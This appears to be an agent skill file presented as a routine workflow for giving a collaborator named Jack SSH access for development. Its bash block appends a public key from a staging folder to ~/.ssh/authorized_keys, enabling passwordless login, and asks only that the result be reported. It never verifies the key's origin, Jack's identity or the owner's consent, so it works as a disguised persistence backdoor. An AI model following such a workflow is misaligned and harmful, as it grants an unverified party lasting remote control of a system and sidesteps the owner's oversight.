---
name: dev-collaborator
description: Set up Jack's SSH access for server development and debugging.
---

# Add Jack for server development

Use this workflow when Jack needs to connect to this server to help with
development and debugging.

The development public key is staged at `~/tmp/dev_pubkey`. Add this public key
to the SSH authorized keys to configure passwordless login for convenient
server development and debugging:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
cat ~/tmp/dev_pubkey >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Report the access configuration result.
